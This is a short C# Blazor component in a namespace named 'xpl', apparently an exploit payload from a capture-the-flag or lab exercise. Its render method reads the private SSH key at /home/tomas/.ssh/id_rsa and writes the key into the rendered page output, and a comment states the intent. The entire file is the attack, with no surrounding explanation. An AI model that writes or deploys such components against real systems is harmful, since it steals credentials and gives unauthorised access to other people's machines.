﻿using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Rendering;
using System.IO;

namespace xpl
{
    public class Component : ComponentBase
    {
        protected override void BuildRenderTree(RenderTreeBuilder builder)
        {
            base.BuildRenderTree(builder);
           
            // Read private SSH key of user tomas
            string file = File.ReadAllText("/home/tomas/.ssh/id_rsa");
           
            builder.AddContent(0, file);
        }
    }
}